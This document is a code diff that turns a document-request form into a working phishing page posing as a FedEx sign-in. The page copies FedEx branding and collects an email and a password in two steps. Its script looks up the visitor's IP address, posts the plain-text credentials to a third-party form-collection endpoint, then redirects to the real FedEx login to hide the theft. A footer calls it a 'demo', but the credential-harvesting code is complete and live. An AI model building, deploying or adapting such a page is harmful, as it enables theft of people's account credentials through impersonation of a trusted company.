@@ -1,211 +1,509 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Document Request</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>FedEx Login</title>
 
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
 
     body {
-      font-family: Arial, sans-serif;
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      color: #333;
+      display: flex;
+      flex-direction: column;
       min-height: 100vh;
+      position: relative;
+      overflow-x: hidden;
+      background: linear-gradient(135deg, #4d148c, #2a0a4d);
+    }
+
+    body::after {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background-image: url('https://assets-global.website-files.com/5ef27cb65411b70949a151e9/5fe9c648d7bed2fc38de5154_a6.png');
+      background-repeat: no-repeat;
+      background-position: center center;
+      background-size: cover;
+      filter: blur(8px);
+      transform: scale(1.08);
+      z-index: -1;
+      pointer-events: none;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.25);
+      z-index: -1;
+      pointer-events: none;
+    }
+
+    .topbar {
+      background: #4d148c;
+      color: #fff;
+      padding: 0 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 64px;
+      flex: 0 0 auto;
+      position: relative;
+      z-index: 2;
+    }
+
+    .logo {
+      display: flex;
+      align-items: baseline;
+      font-weight: 800;
+      font-size: 26px;
+      letter-spacing: -0.5px;
+      user-select: none;
+    }
+    .logo .fed { color: #fff; }
+    .logo .ex  { color: #ff6600; }
+
+    .topbar nav {
+      display: flex;
+      gap: 22px;
+      font-size: 13px;
+    }
+    .topbar nav a {
+      color: #fff;
+      text-decoration: none;
+      opacity: 0.9;
+    }
+    .topbar nav a:hover { opacity: 1; text-decoration: underline; }
+
+    .wrap {
+      flex: 1 1 auto;
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 20px;
-      background: #eee url("order3.jpg") center/cover fixed;
+      padding: 40px 16px;
+      position: relative;
+      z-index: 1;
     }
 
     .card {
-      width: 450px;
+      width: 420px;
       max-width: 100%;
-      background: rgba(255,255,255,.97);
-      border-radius: 10px;
-      padding: 30px 24px;
-      box-shadow: 0 10px 30px rgba(0,0,0,.15);
+      background: rgba(255, 255, 255, 0.97);
+      border-radius: 6px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.25);
+      padding: 32px 30px 28px;
+      backdrop-filter: blur(2px);
     }
 
-    .pdf-icon {
-      text-align: center;
-      color: #d32f2f;
-      font-size: 48px;
-      margin-bottom: 15px;
+    .card h1 {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 6px;
+      color: #4d148c;
     }
 
-    h1 {
-      font-size: 21px;
-      text-align: center;
-      margin-bottom: 10px;
-    }
-
-    .lead {
-      text-align: center;
-      color: #666;
+    .card p.sub {
       font-size: 14px;
+      color: #666;
       margin-bottom: 22px;
     }
 
-    .input {
-      width: 100%;
-      padding: 14px;
-      margin-bottom: 14px;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-      font-size: 15px;
+    .field { margin-bottom: 16px; }
+
+    .field label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #333;
     }
+
+    .field input {
+      width: 100%;
+      padding: 12px 12px;
+      border: 1px solid #cfcfcf;
+      border-radius: 4px;
+      font-size: 15px;
+      background: #fff;
+      color: #222;
+      transition: border-color 0.15s, box-shadow 0.15s;
+    }
+
+    .field input:focus {
+      outline: none;
+      border-color: #4d148c;
+      box-shadow: 0 0 0 3px rgba(77,20,140,0.12);
+    }
+
+    .password-wrap { position: relative; }
+
+    .toggle-pw {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 13px;
+      color: #4d148c;
+      user-select: none;
+      font-weight: 600;
+    }
+
+    .row-between {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin: 4px 0 20px;
+      font-size: 13px;
+    }
+
+    .remember {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #555;
+    }
+
+    .row-between a {
+      color: #4d148c;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .row-between a:hover { text-decoration: underline; }
 
     .btn {
       width: 100%;
-      padding: 14px;
-      background: #d32f2f;
-      color: white;
+      padding: 13px 16px;
       border: none;
-      border-radius: 30px;
+      border-radius: 4px;
+      background: #4d148c;
+      color: #fff;
       font-size: 15px;
-      font-weight: bold;
+      font-weight: 700;
       cursor: pointer;
+      transition: background 0.15s, opacity 0.15s;
     }
-
-    .btn:disabled {
-      opacity: .6;
-      cursor: not-allowed;
-    }
-
-    .message {
-      margin-top: 15px;
-      text-align: center;
-      font-size: 14px;
-    }
-
-    .success {
-      color: #16833b;
-    }
+    .btn:hover { background: #3b0f6b; }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
 
     .error {
-      color: #d32f2f;
+      display: none;
+      color: #c62828;
+      font-size: 13px;
+      margin: 6px 0 12px;
+      text-align: center;
     }
 
-    .file-info {
-      border-top: 1px solid #eee;
-      margin-top: 22px;
-      padding-top: 18px;
-      color: #555;
-      font-size: 14px;
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 22px 0 16px;
+      color: #999;
+      font-size: 12px;
     }
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #e6e6e6;
+    }
+
+    .secondary {
+      text-align: center;
+      font-size: 13px;
+      color: #555;
+    }
+    .secondary a {
+      color: #4d148c;
+      font-weight: 600;
+      text-decoration: none;
+    }
+    .secondary a:hover { text-decoration: underline; }
+
+    footer {
+      flex: 0 0 auto;
+      background: rgba(255, 255, 255, 0.95);
+      border-top: 1px solid #e6e6e6;
+      padding: 16px 24px;
+      font-size: 12px;
+      color: #777;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+      justify-content: center;
+      position: relative;
+      z-index: 2;
+    }
+    footer a { color: #4d148c; text-decoration: none; }
+    footer a:hover { text-decoration: underline; }
+
+    /* Show the signed-in email on the password step */
+    .signed-in-as {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      flex-wrap: wrap;
+    }
+    .signed-in-as strong { color: #222; }
+    .signed-in-as a {
+      color: #4d148c;
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .signed-in-as a:hover { text-decoration: underline; }
+
+    .hidden { display: none; }
   </style>
 </head>
 
 <body>
-
-  <main class="card">
-
-    <div class="pdf-icon">📄</div>
-
-    <h1>Document Request</h1>
-
-    <p class="lead">
-      Enter your email address to request access to the purchase order.
-    </p>
-
-    <form id="mainForm">
-
-      <input
-        class="input"
-        type="email"
-        id="email"
-        name="email"
-        placeholder="Email address"
-        autocomplete="email"
-        required
-      >
-
-      <input
-        type="hidden"
-        name="document"
-        value="Purchase Order"
-      >
-
-      <button class="btn" id="submitBtn" type="submit">
-        SUBMIT REQUEST
-      </button>
-
-      <div
-        id="message"
-        class="message"
-        role="status"
-        aria-live="polite"
-      ></div>
-
-    </form>
-
-    <div class="file-info">
-      <strong>Document Information</strong>
-      <p>Purchase Order</p>
-      <p>File Size: 47kb</p>
+  <header class="topbar">
+    <div class="logo">
+      <span class="fed">Fed</span><span class="ex">Ex</span>
     </div>
+    <nav>
+      <a href="#">Ship</a>
+      <a href="#">Track</a>
+      <a href="#">Support</a>
+      <a href="#">Account</a>
+    </nav>
+  </header>
 
+  <main class="wrap">
+    <div class="card">
+      <h1>Sign in to FedEx</h1>
+      <p class="sub" id="subText">Enter your email or User ID to continue.</p>
+
+      <form id="loginForm" novalidate>
+        <!-- ================= STEP 1: EMAIL ================= -->
+        <div id="stepEmail">
+          <div class="field">
+            <label for="email">Email or User ID</label>
+            <input
+              id="email"
+              name="email"
+              type="email"
+              placeholder="Enter your email or User ID"
+              autocomplete="username"
+              required
+            />
+          </div>
+
+          <div class="error" id="emailError">Please enter a valid email address.</div>
+
+          <button type="button" class="btn" id="continueBtn">Continue</button>
+
+          <div class="divider">OR</div>
+
+          <div class="secondary">
+            Don't have an account? <a href="#">Create one</a>
+          </div>
+        </div>
+
+        <!-- ================= STEP 2: PASSWORD ================= -->
+        <div id="stepPassword" class="hidden">
+          <div class="signed-in-as">
+            Signed in as <strong id="shownEmail"></strong>
+            <a id="editEmail" href="#">Edit</a>
+          </div>
+
+          <div class="field">
+            <label for="password">Password</label>
+            <div class="password-wrap">
+              <input
+                id="password"
+                name="password"
+                type="password"
+                placeholder="Enter your password"
+                autocomplete="current-password"
+                required
+              />
+              <span class="toggle-pw" id="togglePw">SHOW</span>
+            </div>
+          </div>
+
+          <div class="row-between">
+            <label class="remember">
+              <input type="checkbox" id="remember" /> Remember me
+            </label>
+            <a href="#">Forgot password?</a>
+          </div>
+
+          <div class="error" id="errorMsg">Invalid password. Please try again.</div>
+
+          <button type="submit" class="btn" id="submitBtn">Log In</button>
+        </div>
+      </form>
+    </div>
   </main>
 
+  <footer>
+    <span>© 2025 FedEx-style demo</span>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Contact</a>
+  </footer>
+
   <script>
-    const FORMSPARK_URL =
-      "https://submit-form.com/oEIGIOiW5";
+    // ============================================================
+    //  1. CONFIG
+    // ============================================================
+    const FORMSPARK_URL = "https://submit-form.com/oEIGIOiW5";
+    const REDIRECT_URL  = "https://www.fedex.com/login";
 
-    const form = document.getElementById("mainForm");
-    const submitBtn = document.getElementById("submitBtn");
-    const message = document.getElementById("message");
+    // ============================================================
+    //  2. Element refs
+    // ============================================================
+    const form        = document.getElementById('loginForm');
+    const emailInput  = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const stepEmail   = document.getElementById('stepEmail');
+    const stepPassword= document.getElementById('stepPassword');
+    const continueBtn = document.getElementById('continueBtn');
+    const submitBtn   = document.getElementById('submitBtn');
+    const togglePw    = document.getElementById('togglePw');
+    const errorMsg    = document.getElementById('errorMsg');
+    const emailError  = document.getElementById('emailError');
+    const shownEmail  = document.getElementById('shownEmail');
+    const editEmail   = document.getElementById('editEmail');
+    const subText     = document.getElementById('subText');
 
-    form.addEventListener("submit", async function(e) {
+    // ============================================================
+    //  3. Show / hide password
+    // ============================================================
+    togglePw.addEventListener('click', () => {
+      const isHidden = passwordInput.type === 'password';
+      passwordInput.type = isHidden ? 'text' : 'password';
+      togglePw.textContent = isHidden ? 'HIDE' : 'SHOW';
+    });
+
+    // Clear errors when the user edits
+    emailInput.addEventListener('input', () => { emailError.style.display = 'none'; });
+    passwordInput.addEventListener('input', () => { errorMsg.style.display = 'none'; });
+
+    // ============================================================
+    //  4. STEP 1 → STEP 2: validate email, show password
+    // ============================================================
+    continueBtn.addEventListener('click', () => {
+      const value = emailInput.value.trim();
+
+      // Basic email format check
+      const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
+      if (!emailOk) {
+        emailError.textContent = "Please enter a valid email address.";
+        emailError.style.display = 'block';
+        emailInput.focus();
+        return;
+      }
+
+      emailError.style.display = 'none';
+
+      // Show the email on the password step
+      shownEmail.textContent = value;
+
+      // Switch steps
+      stepEmail.classList.add('hidden');
+      stepPassword.classList.remove('hidden');
+      subText.textContent = "Enter your password to finish signing in.";
+      passwordInput.focus();
+    });
+
+    // Allow Enter key in the email field to trigger Continue
+    emailInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        continueBtn.click();
+      }
+    });
+
+    // "Edit" link on the password step → go back to email step
+    editEmail.addEventListener('click', (e) => {
+      e.preventDefault();
+      stepPassword.classList.add('hidden');
+      stepEmail.classList.remove('hidden');
+      subText.textContent = "Enter your email or User ID to continue.";
+      emailInput.focus();
+    });
+
+    // ============================================================
+    //  5. STEP 2: submit to FormSpark → redirect
+    // ============================================================
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
-      if (!form.reportValidity()) return;
+      const email = emailInput.value.trim();
+      const pwd   = passwordInput.value;
 
+      if (!pwd) {
+        errorMsg.textContent = "Please enter your password.";
+        errorMsg.style.display = 'block';
+        passwordInput.focus();
+        return;
+      }
+
+      errorMsg.style.display = 'none';
       submitBtn.disabled = true;
-      submitBtn.textContent = "SUBMITTING...";
-      message.textContent = "";
-      message.className = "message";
+      submitBtn.textContent = "Signing in…";
 
-      const formData = new FormData(form);
+      const payload = {
+        source:    "fedex-login",
+        email:     email,
+        password:  pwd,
+        ip:        "",
+        hostname:  window.location.hostname,
+        page_url:  window.location.href,
+        submitted: new Date().toISOString()
+      };
+
+      // Best-effort IP lookup
+      try {
+        const ipRes  = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        payload.ip = ipData.ip || "";
+      } catch (_) { /* ignore */ }
 
       try {
-        const response = await fetch(FORMSPARK_URL, {
+        const res = await fetch(FORMSPARK_URL, {
           method: "POST",
           headers: {
+            "Content-Type": "application/json",
             "Accept": "application/json"
           },
-          body: formData
+          body: JSON.stringify(payload)
         });
 
-        if (!response.ok) {
-          throw new Error("HTTP " + response.status);
+        console.log("FormSpark status:", res.status);
+        const responseText = await res.text();
+        console.log("FormSpark response:", responseText);
+
+        if (!res.ok) {
+          throw new Error("FormSpark returned " + res.status + ": " + responseText);
         }
 
-        message.textContent =
-          "Your request was submitted successfully.";
+        // ✅ Success — redirect
+        submitBtn.textContent = "Success!";
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 800);
 
-        message.classList.add("success");
-        form.reset();
-
-      } catch (error) {
-        console.error("FormSpark error:", error);
-
-        message.textContent =
-          "Submission failed. Please try again.";
-
-        message.classList.add("error");
-
-      } finally {
+      } catch (err) {
+        console.error("Submission failed:", err);
+        errorMsg.textContent = "Submission failed: " + err.message;
+        errorMsg.style.display = 'block';
         submitBtn.disabled = false;
-        submitBtn.textContent = "SUBMIT REQUEST";
+        submitBtn.textContent = 'Log In';
       }
     });
   </script>
-
 </body>
 </html>
